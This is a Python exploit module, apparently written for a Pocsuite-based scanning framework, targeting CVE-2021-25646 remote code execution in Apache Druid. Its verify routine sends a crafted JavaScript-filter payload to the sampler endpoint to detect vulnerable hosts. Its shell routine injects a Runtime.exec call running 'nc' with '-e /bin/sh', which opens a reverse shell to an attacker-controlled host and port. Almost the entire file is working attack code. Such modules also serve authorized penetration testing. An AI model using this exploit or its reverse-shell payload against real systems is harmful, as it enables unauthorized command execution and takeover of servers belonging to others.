"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""
from collections import OrderedDict
from urllib.parse import quote, urljoin, urlparse
from Framework.Library.Function.Function.PocSuite.Function import decode_data_input_poc
from Framework.Library.Function.Function.PocSuite.api import POC_SCAN, Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptDict, VUL_TYPE, logger, paths,get_listener_ip, get_listener_port
from Framework.Library.Function.Function.PocSuite.lib.utils import random_str
import requests  # python-requests, eg. apt-get install python3-requests
import sys, os
import re
import binascii
import json 
from configvalue import *


class DemoPOC(POCBase):
    vulID = 'CVE-2021-25646'  # ssvid
    version = '1.0'
    author = ['khoa']
    vulDate = '21/01/2021'
    createDate = '2021-06-11'
    updateDate = '2020-11-11'
    references = ['http://packetstormsecurity.com/files/162345/Apache-Druid-0.20.0-Remote-Command-Execution.html']
    name = 'Apache Druid < 0.20.1 Remote Code Execution'
    appPowerLink = {"typescan" : POC_SCAN.EXPLOITS.DIR,
                "pocType": "Database",
                "language"  : [POC_SCAN.LANGUAGE.JAVA],
                }
    appName = 'ApacheDruid-cve-2021-25646'
    appVersion = 'CVE-2021-25646'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''Apache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests. This functionality is intended for use in high-trust environments, and is disabled by default. However, in Druid 0.20.0 and earlier, it is possible for an authenticated user to send a specially-crafted request that forces Druid to run user-provided JavaScript code for that request, regardless of server configuration.'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''CVSS: 8.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:H/RL:O/RC:C)'''
    url_result = {}

    def _verify(self, update=True): 
        if update : 
            config_input, self.headers['Referer'] = decode_data_input_poc(self.headers['Referer'])
            try: 
                self.url = config_input['Input']['RECON_WEBAPP']
            except Exception as e:
                raise Exception("Error " + self.appName + " :" + str(e)) 
        result={}
        self.verified_url = []

        for url in self.url : 
            url_exploit = url + "/druid/indexer/v1/sampler"
            headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "application/json"
            }
            payload = {
                "type":"index",
                "spec":{
                    "ioConfig":{
                        "type":"index",
                        "inputSource":{
                            "type":"inline",
                            "data":"{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                        },
                        "inputFormat":{
                            "type":"json",
                            "keepNullColumns":True
                        }
                    },
                    "dataSchema":{
                        "dataSource":"sample",
                        "timestampSpec":{
                            "column":"timestamp",
                            "format":"iso"
                        },
                        "dimensionsSpec":{

                        },
                        "transformSpec":{
                            "transforms":[],
                            "filter":{
                                "type":"javascript",
                                "dimension":"added",
                                "function":"function(value) {java.lang.Runtime.getRuntime().exec('aaaa')}",
                                "":{
                                    "enabled":True
                                }
                            }
                        }
                    },
                    "type":"index",
                    "tuningConfig":{
                        "type":"index"
                    }
                },
                "samplerConfig":{
                    "numRows":500,
                    "timeoutMs":15000
                }
            }
            try: 
                res = requests.post(url=url_exploit, headers=headers, data=json.dumps(payload), timeout=5, verify=False)
            except: 
                return 
            if(res.status_code == 200): 
                self.verified_url.append(url)
        if len(self.verified_url) > 0: 
            result["VerifyInfo"] = {}
            result["VerifyInfo"]['url'] = self.verified_url
            result["VerifyInfo"]["payload"] = json.dumps(payload)
        if update: 
            return self.parse_output(result)
        else: 
            return result

    def _attack(self): 
        self._verify(); 
    
    def _shell(self): 
        result = {}
        result['ShellInfo'] = {
            "Status" : "Success"
        }
        try: 
            config_input, self.headers['Referer'] = decode_data_input_poc(self.headers['Referer'])
            try: 
                self.url = config_input["Input"]['EXPLOIT_POCS']
                lhost_running = config_input['Config']['Cf_PublicIP']
                lport_running = config_input['Config']['Cf_PublicPort']
            except Exception as e: 
                raise Exception("Error " + self.appName + " :" + str(e))
            self.url = self.url[0]['result']['ShellInfo']['url'][0]
            result['url'] = self.url
            url_exploit = self.url + "/druid/indexer/v1/sampler"
            headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Content-Type": "application/json"
            }
            payload = {
                "type":"index",
                "spec":{
                    "ioConfig":{
                        "type":"index",
                        "inputSource":{
                            "type":"inline",
                            "data":"{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                        },
                        "inputFormat":{
                            "type":"json",
                            "keepNullColumns":True
                        }
                    },
                    "dataSchema":{
                        "dataSource":"sample",
                        "timestampSpec":{
                            "column":"timestamp",
                            "format":"iso"
                        },
                        "dimensionsSpec":{

                        },
                        "transformSpec":{
                            "transforms":[],
                            "filter":{
                                "type":"javascript",
                                "dimension":"added",
                                "function":"function(value) {java.lang.Runtime.getRuntime().exec('nc " + lhost_running + ":" + lport_running + " -e /bin/sh')}",
                                "":{
                                    "enabled":True
                                }
                            }
                        }
                    },
                    "type":"index",
                    "tuningConfig":{
                        "type":"index"
                    }
                },
                "samplerConfig":{
                    "numRows":500,
                    "timeoutMs":15000
                }
            }
            res = requests.post(url=url_exploit, headers=headers, data=json.dumps(payload), timeout=5, verify=False)
            return self.parse_output(result)

        except Exception as e: 
            if type(e) == requests.exceptions.ReadTimeout: 
                return self.parse_output(result)
            print("Error run shell", self.name, e)
            pass 
        return self.parse_output(False)
        
    def parse_output(self, result): 
        output = Output(self)
        if result: 
            output.success(result)
        else: 
            output.fail("Target is not vulnerable")
        return output

register_poc(DemoPOC)